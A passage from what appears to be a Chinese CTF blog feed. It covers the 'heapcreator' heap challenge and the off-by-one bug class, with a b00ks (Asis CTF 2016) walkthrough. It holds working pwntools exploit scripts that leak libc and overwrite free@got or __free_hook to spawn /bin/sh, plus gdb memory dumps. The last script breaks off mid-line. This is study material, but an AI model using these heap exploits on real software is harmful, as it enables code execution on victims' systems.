class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>LL);  v1 = atoi(&amp;buf);  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">9</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);    _exit(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-keyword">if</span> ( heaparray[v1] )  &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>, &amp;buf);    read_input(*((_QWORD *)heaparray[v1] + <span class="hljs-number">1</span>), *(_QWORD *)heaparray[v1] + <span class="hljs-number">1L</span>L);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);  &#125;  <span class="hljs-keyword">else</span>  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre><h3 id="基本功能">基本功能<a class="post-anchor" href="#基本功能"></a></h3><p>程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下</p><ol><li>创建堆，根据用户输入的长度，申请对应内存空间，并利用read 读取指定长度内容。这里长度没有进行检测，当长度为负数的时候，会出现任意长度堆溢出的漏洞。当前，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li><li>编辑堆，根据指定的索引以及之前存储的堆的大小读取内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 漏洞。</li><li>展示堆，输出指定索引堆的大小以及内容。</li><li>删除堆，删除指定堆，并且将对应指针设置为了NULL。</li></ol><h2 id="利用">利用<a class="post-anchor" href="#利用"></a></h2><p>基本利用思路如下</p><ol><li>利用 off by one 漏洞覆盖下一个chunk 的size 字段，从而构造伪造的chunk 大小。</li><li>申请伪造的chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li></ol><p>exp</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *r = process(<span class="hljs-string">'./heapcreator'</span>)heap = ELF(<span class="hljs-string">'./heapcreator'</span>)libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size, content)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"1"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(size))    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx, content)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"2"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"3"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"4"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))free_got = <span class="hljs-number">0x602018</span>create(<span class="hljs-number">0x18</span>, <span class="hljs-string">"dada"</span>)  <span class="hljs-comment"># 0</span>create(<span class="hljs-number">0x10</span>, <span class="hljs-string">"ddaa"</span>)  <span class="hljs-comment"># 1</span><span class="hljs-comment"># overwrite heap 1's struct's size to 0x41</span>edit(<span class="hljs-number">0</span>, <span class="hljs-string">"/bin/sh\x00"</span> + <span class="hljs-string">"a"</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">"\x41"</span>)<span class="hljs-comment"># trigger heap 1's struct to fastbin 0x40</span><span class="hljs-comment"># heap 1's content to fastbin 0x20</span>delete(<span class="hljs-number">1</span>)<span class="hljs-comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span><span class="hljs-comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span><span class="hljs-comment"># that is to say we can overwrite new heap 1's struct</span><span class="hljs-comment"># here we overwrite its heap content pointer to free@got</span>create(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x30</span>) + p64(heap.got[<span class="hljs-string">'free'</span>]))  <span class="hljs-comment">#1</span><span class="hljs-comment"># leak freeaddr</span>show(<span class="hljs-number">1</span>)r.recvuntil(<span class="hljs-string">"Content : "</span>)data = r.recvuntil(<span class="hljs-string">"Done !"</span>)free_addr = u64(data.split(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))libc_base = free_addr - libc.symbols[<span class="hljs-string">'free'</span>]log.success(<span class="hljs-string">'libc base addr: '</span> + hex(libc_base))system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]<span class="hljs-comment">#gdb.attach(r)</span><span class="hljs-comment"># overwrite free@got with system addr</span>edit(<span class="hljs-number">1</span>, p64(system_addr))<span class="hljs-comment"># trigger system("/bin/sh")</span>delete(<span class="hljs-number">0</span>)r.interactive()</code></pre><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh=process(<span class="hljs-string">'./heapcreator'</span>)elf=ELF(<span class="hljs-string">'./heapcreator'</span>)libc=ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,value)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'1'</span>)    sh.recvuntil(<span class="hljs-string">'Size of Heap :'</span>)    sh.sendline(str(size))    sh.recvuntil(<span class="hljs-string">'Content of heap:'</span>)    sh.sendline(value)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,value)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'2'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))    sh.recvuntil(<span class="hljs-string">'Content of heap : '</span>)    sh.sendline(value)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'3'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'4'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))free_got=elf.got[<span class="hljs-string">'free'</span>]create(<span class="hljs-number">0x18</span>,<span class="hljs-string">'aaaaaaa'</span>)  <span class="hljs-comment">#idx0 实际分配了0x10的chunk，重用idx1的prev_size的8个字节</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'aaaaaaa'</span>)　<span class="hljs-comment">#idx1　　</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'aaaaaaa'</span>)　　<span class="hljs-comment">#idx2</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>)　　<span class="hljs-comment">#idx3</span>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">'\x81'</span>edit(<span class="hljs-number">0</span>,payload)   <span class="hljs-comment">#修改idx1的size为0x81</span>delete(<span class="hljs-number">1</span>)　　<span class="hljs-comment">#idx1进入0x70的unsorted bin</span>size=<span class="hljs-string">'\x08'</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x40</span>+size+p64(free_got)create(<span class="hljs-number">0x70</span>,payload)　　<span class="hljs-comment">#分配到idx1 此时size为0x70，可以堆溢出到idx2，修改idx2的内容指针为free_got</span>show(<span class="hljs-number">2</span>)　　<span class="hljs-comment">#输出free真实地址,泄露libc基地址</span>sh.recvuntil(<span class="hljs-string">'Content :'</span>)free_adr=u64(sh.recvline().strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-keyword">print</span> <span class="hljs-string">'free_adr: '</span>+hex(free_adr)libc_base=free_adr-libc.symbols[<span class="hljs-string">'free'</span>]system_adr=libc_base+libc.symbols[<span class="hljs-string">'system'</span>]<span class="hljs-keyword">print</span> <span class="hljs-string">'libc_base: '</span>+hex(libc_base)<span class="hljs-keyword">print</span> <span class="hljs-string">'system_adr: '</span>+hex(system_adr)edit(<span class="hljs-number">2</span>,p64(system_adr)) <span class="hljs-comment">#将free_got改为system地址</span>delete(<span class="hljs-number">3</span>)　　　　　　　　<span class="hljs-comment">#free(idx-&gt;content)触发</span>sh.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geek 10th write up</title>
      <link href="/2019/10/17/Geek-10th-write-up/"/>
      <url>/2019/10/17/Geek-10th-write-up/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Off-By-One学习</title>
      <link href="/2019/10/10/Off-By-One%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/10/Off-By-One%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><h2 id="原理">原理<a class="post-anchor" href="#原理"></a></h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>一般来说，单字节溢出被认为是难以利用，但是因为 linux 的堆管理机制 ptmalloc 验证的松散性，基于 linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss段等等。但是堆上（heap based）的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h2 id="off-by-one-利用思路">off-by-one 利用思路<a class="post-anchor" href="#off-by-one-利用思路"></a></h2><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得<code>prev_in_use</code>位被清，这样前块会被认为是 free 块。(1) 这时可以选择使用 unlink 方法进行处理。(2) 另外，这时<code>prev_size</code>域就会启用，就可以伪造<code>prev_size</code>，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照<code>prev_size</code>找到块的后一块（理论上是当前正在unlink的块）与当前正在 unlink 的块大小是否相等。</li></ol><p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check。</p><pre><code class="hljs cpp"><span class="hljs-comment">/* consolidate backward */</span>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (<span class="hljs-string">"corrupted size vs. prev_size while consolidating"</span>);      unlink_chunk (av, p);    &#125;</code></pre><h3 id="示例1">示例1<a class="post-anchor" href="#示例1"></a></h3><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">my_gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ptr,<span class="hljs-keyword">int</span> size)</span></span>&#123;    <span class="hljs-keyword">int</span> i;    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)    &#123;        ptr[i]=getchar();    &#125;    <span class="hljs-keyword">return</span> i;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *chunk1,*chunk2;    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input:"</span>);    my_gets(chunk1,<span class="hljs-number">16</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了依次，这也被称为栅栏错误</p><p>我们使用gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为16 字节的堆块</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk20x602030:   0x0000000000000000  0x0000000000000000</code></pre><p>当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print ‘A’*17</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk10x602010:   0x4141414141414141  0x41414141414141410x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk20x602030:   0x0000000000000000  0x0000000000000000</code></pre><h3 id="实例2">实例2<a class="post-anchor" href="#实例2"></a></h3><p>第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">""</span>;    <span class="hljs-keyword">void</span> *chunk1;    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input"</span>);    gets(buffer);    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)    &#123;        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。<br>但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。<br>strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000210x602010:   0x4141414141414141  0x41414141414141410x602020:   0x4141414141414141  0x0000000000000400</code></pre><p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。<br>还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p><pre><code class="hljs assembly">DWORD 0x41424344内存  0x44,0x43,0x42,0x41</code></pre><h3 id="实例1–-Asis-CTF-2016-b00ks">实例1– Asis CTF 2016 b00ks<a class="post-anchor" href="#实例1–-Asis-CTF-2016-b00ks"></a></h3><p><strong>题目介绍</strong></p><p>题目是一个常见的菜单式程序，功能是一个图书管理系统。</p><pre><code class="hljs python"><span class="hljs-number">1.</span> Create a book<span class="hljs-number">2.</span> Delete a book<span class="hljs-number">3.</span> Edit a book<span class="hljs-number">4.</span> Print book detail<span class="hljs-number">5.</span> Change current author name<span class="hljs-number">6.</span> Exit</code></pre><p>题目提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示</p><pre><code class="hljs bash">Canary                        : NoNX                            : YesPIE                           : YesFortify                       : NoRelRO                         : Full</code></pre><p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span>&#123;</span>    <span class="hljs-keyword">int</span> id;    <span class="hljs-keyword">char</span> *name;    <span class="hljs-keyword">char</span> *description;    <span class="hljs-keyword">int</span> size;&#125;</code></pre><p><strong>create</strong></p><p>book 结构中存在 name 和 description，name 和 description 在堆上分配。首先分配 name buffer，使用malloc。大小自定但小于 32.</p><pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book name size: "</span>, *(_QWORD *)&amp;size);__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>, &amp;size);ptr = <span class="hljs-built_in">malloc</span>(size);</code></pre><p>之后分配 description ，同样大小自定但无限制。</p><pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;size);__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);v5 = <span class="hljs-built_in">malloc</span>(size);</code></pre><p>之后分配 book 结构的内存</p><pre><code class="hljs cpp">book = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);<span class="hljs-keyword">if</span> ( book )&#123;    *((_DWORD *)book + <span class="hljs-number">6</span>) = size;    *((_QWORD *)off_202010 + v2) = book;    *((_QWORD *)book + <span class="hljs-number">2</span>) = description;    *((_QWORD *)book + <span class="hljs-number">1</span>) = name;    *(_DWORD *)book = ++unk_202024;    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre><p><strong>漏洞</strong></p><p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。</p><pre><code class="hljs cpp"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">my_read</span><span class="hljs-params">(_BYTE *ptr, <span class="hljs-keyword">int</span> number)</span></span>&#123;  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>  _BYTE *buf; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  <span class="hljs-keyword">if</span> ( number &lt;= <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;  buf = ptr;  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )  &#123;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1u</span>LL) != <span class="hljs-number">1</span> )      <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;    <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-string">'\n'</span> )      <span class="hljs-keyword">break</span>;    ++buf;    <span class="hljs-keyword">if</span> ( i == number )      <span class="hljs-keyword">break</span>;  &#125;  *buf = <span class="hljs-number">0</span>; --》 漏洞位置  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre><h4 id="利用">利用<a class="post-anchor" href="#利用"></a></h4><p>创建两个<code>b00k</code>, 在<code>first b00k</code>中伪造<code>b00k</code>进而控制<code>second b00k</code>的<code>description</code>指针, 将该指针改为<code>__free_hook</code>, 修改<code>second b00k</code>的<code>description</code>为<code>execve(&quot;/bin/sh&quot;)</code>, 最后<code>free</code></p><p><strong>泄露</strong></p><p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p><p>books 位置</p><pre><code class="hljs assembly">        0x55865b7c9040:    0x4141414141414141    0x4141414141414141        0x55865b7c9050:    0x4141414141414141    0x4141414141414141 --&gt; authorb00ks&lt;--0x55865b7c9060:    0x000055865cc0d160(first book)    0x0000000000000000</code></pre><p>null byte overflow</p><pre><code class="hljs assembly">0x55865b7c9040:    0x4141414141414141    0x41414141414141410x55865b7c9050:    0x4141414141414141    0x41414141414141410x55865b7c9060:    0x000055865cc0d100(0x60--&gt;0x00)    0x000055865cc0d190</code></pre><p><strong>1. 创建第一个firest book</strong></p><pre><code class="hljs assembly">0x55f276c74160:    0x0000000000000001                 0x000055f276c74020--&gt; Name0x55f276c74170:    0x000055f276c740c0(description)    0x000000000000008c(140)</code></pre><p>当<code>0x55f276c74160 --&gt; 0x55f276c74100</code>时, <code>0x55f276c74100</code>正好落在<code>first b00k</code>的<code>description</code>中, 属于可控范围, 为我们伪造<code>b00k</code>打下了基础.</p><p><strong>2. leak book1 addr</strong></p><p>my_read 读入的结束符 ‘\x00’ 会被写如 book1 时覆盖</p><p>所以 print author name 时 会泄露 book1 在 buf 的地址</p><p><strong>3. 申请 book2</strong></p><p>book2的description的大小越大越好(如0x21000)，这样会通过mmap()函数去分配堆空间，而该堆地址与libc的基址相关，这样通过泄露该堆地址可以计算出libc的基址。</p><p><strong>4. 伪造book</strong></p><pre><code class="hljs assembly">0x55f276c740c0:    0x4141414141414141    0x41414141414141410x55f276c740d0:    0x4141414141414141    0x41414141414141410x55f276c740e0:    0x4141414141414141    0x41414141414141410x55f276c740f0:    0x4141414141414141    0x41414141414141410x55f276c74100:    0x0000000000000001    0x000055f276c74198----0x55f276c74110:    0x000055f276c74198    0x000000000000ffff   |......                                                   |0x55f276c74160:    0x0000000000000001    0x000055f276c74020   |0x55f276c74170:    0x000055f276c740c0    0x000000000000008c   |0x55f276c74180:    0x0000000000000000    0x0000000000000031   |0x55f276c74190:    0x0000000000000002    0x00007f282b8e7010 &lt;-|0x55f276c741a0:    0x00007f282b8c5010    0x00000000000210000x55f276c741b0:    0x0000000000000000    0x0000000000020e51</code></pre><p>可以看到<code>0x55f276c74100</code>已经是<code>fake b00k1</code></p><p><strong>5. 空字节覆盖 leak book2 name pointer&amp;libcbase</strong></p><pre><code class="hljs assembly">0x55f275d55040:    0x4141414141414141    0x41414141414141410x55f275d55050:    0x4141414141414141    0x41414141414141410x55f275d55060:    0x000055f276c74100    0x000055f276c74190</code></pre><p>泄露的是<code>second b00k</code>的<code>name pointer</code>和<code>description pointer</code>.<br>这个指针和libc base address是有直接联系的.</p><pre><code class="hljs assembly">0x000055f276c73000 0x000055f276c95000 rw-p    [heap]0x00007f282b33e000 0x00007f282b4fe000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007f282b4fe000 0x00007f282b6fe000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so</code></pre><p>  <code>offset = 0x7f282b8e7010 - 0x00007f282b33e000 = 0x5a9010</code><br>  <strong>结论:</strong> 通过伪造的<code>b00k</code>, 我们泄露了 <code>libc base address</code>.</p><p>**6. 获取相关指针</p><p>主要是两个</p><pre><code class="hljs assembly">malloc_hook = libc.symbols[&apos;__free_hook&apos;] + libcbaseexecve_addr = libcbase + 0x4526a</code></pre><p> <strong>结论:</strong>  通过<code>libc base address</code>, 退出了<code>__free_hook</code>和<code>execve_addr</code>在程序中的实际位置.</p><p><strong>7. 修改 get shell</strong></p><p>通过先后修改<code>book1_description</code>和<code>book2_description</code>，可以实现任意地址写任意内容的功能。由于该程序启用了<code>FULL RELRO</code>保护措施，无法对<code>GOT</code>进行改写，但是可以改写<code>__free_hook</code>或<code>__malloc_hook</code>。</p><p>通过<code>first b00k</code>修改<code>second b00k</code>的<code>description</code>指针为<code>__free_hook</code>, 在修改second b00k的description内容为<code>execve(&quot;/bin/sh&quot;, null, environ)</code>, 最后执行<code>free</code></p><pre><code class="hljs assembly">0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |......                                                  |0x7f282b7047a8 &lt;__free_hook&gt;:  0x00007f306ff4726a    0x0000000000000000</code></pre><p><strong>结论:</strong> 由于<code>__free_hook</code>里面的内容不为<code>NULL</code>, 遂执行内容指向的指令, 即<code>execve(&quot;/bin/sh&quot;, null, environ)</code></p><h4 id="相关问题解答">相关问题解答<a class="post-anchor" href="#相关问题解答"></a></h4><p><strong>为什么第二个 b00k申请的空间那么大?</strong></p><blockquote><p>​    If we allocate a chunk bigger than the wilderness chunk, it  mmap’s a new area for use. And this area is adjacent to the libc’s bss  segment<br>简单的说, 申请小了不能够泄露出<code>libc base address</code></p></blockquote><p><strong>exp</strong></p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context.log_level = 'debug'</span>elf = ELF(<span class="hljs-string">"./b00ks"</span>)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)p = process(<span class="hljs-string">"./b00ks"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_name</span><span class="hljs-params">(name)</span>:</span>p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_book</span><span class="hljs-params">(size,name,des_size,des)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">"\nEnter book name size: "</span>,str(size))p.sendlineafter(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>,name)p.sendlineafter(<span class="hljs-string">"\nEnter book description size: "</span>, str(des_size))p.sendlineafter(<span class="hljs-string">"Enter book description: "</span>, des)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_book</span><span class="hljs-params">(id)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>, <span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"Enter the book id you want to delete: "</span>, str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_book</span><span class="hljs-params">(id,new_des)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"Enter the book id you want to edit: "</span>, str(id))p.sendlineafter(<span class="hljs-string">"Enter new book description: "</span>, new_des)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak2</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"4"</span>)p.recvuntil(<span class="hljs-string">"Name: "</span>)msg=p.recvline().strip(<span class="hljs-string">"\n"</span>)    msg=u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))    log.success(<span class="hljs-string">"Leaked address of second book name pointer : "</span> + hex(msg))    <span class="hljs-keyword">return</span> msg<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_name</span><span class="hljs-params">(name)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"5"</span>)p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak1</span><span class="hljs-params">()</span>:</span>p.recvuntil(<span class="hljs-string">"&gt; "</span>)p.sendline(<span class="hljs-string">"4"</span>)p.recvuntil(<span class="hljs-string">"Author:"</span>)msg = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>)[<span class="hljs-number">33</span>:]log.success(<span class="hljs-string">"msg : "</span>+msg)addr = u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))log.success(<span class="hljs-string">"Leaked address of first book : "</span> + hex(addr))<span class="hljs-keyword">return</span> addrcreate_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)create_book(<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>)<span class="hljs-comment">#leak book addr</span>first_addr = 